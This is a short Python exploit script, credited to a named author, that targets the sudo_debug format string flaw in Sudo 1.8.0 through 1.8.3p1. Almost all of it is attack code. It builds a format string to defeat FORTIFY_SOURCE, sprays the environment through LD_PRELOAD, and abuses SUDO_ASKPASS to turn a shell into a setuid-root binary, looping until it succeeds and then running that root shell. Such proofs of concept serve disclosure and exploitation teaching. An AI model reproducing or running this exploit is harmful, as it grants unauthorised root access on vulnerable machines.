#!/usr/bin/env python
# Exploit Title: Sudo sudo_debug format string exploit
# Author: Tyler Borland aka TurboBorland
# Version: Sudo 1.8.0 - 1.8.3p1 inclusive
# Tested on: Fedora fc16 3.x i686 (others like debian/arch don't even need byte bruteforce)
# kills D_FORTIFY_SOURCE %n and positional parameter protection using captain planet trick
# First public exploit as far as I'm aware
# For more information and guide on how this works or how to write it yourself, visit:
# http://www.alertlogic.com/modern-userland-linux-exploitation-courseware/
# *This is a dirty PoC, if you can't figure out the paths, you shouldn't be using this
import os
import sys

vuln = "/usr/bin/sudo" # where the sudo at? 
check = os.stat("/home/exploit/exploit") # check[4] == uid
while (check[4] > 999): # or check[4] == 0
	fmtstring = "%20$08n %1$*482$ %1$*2850$ %1073741824$" # kill D_FORTIFY_SOURCE fmt protections
	args = [fmtstring,"-D9","-A",""] # sudo_debug, sudo_askpass
	env = os.environ
	env['LD_PRELOAD'] = ("\x1f\xa6\x73\xb7"*16250) # 65k size for LD_PRELOAD trick
	env['SUDO_ASKPASS'] = "/home/exploit/own.sh" # abuse the help - chown root:root shell/chmod 4755 shell
	i = os.spawnve("P_WAIT",vuln,args,env) # spawn without taking over current process
	check = os.stat("/home/exploit/exploit") # recheck uid of shell
	#if (int(i) != -11):	exit("valid, but invalid") # valid stack addr, but not right spot
args = ["exploit",""]
os.execve(args[0],args,os.environ); # run shell with uid 0
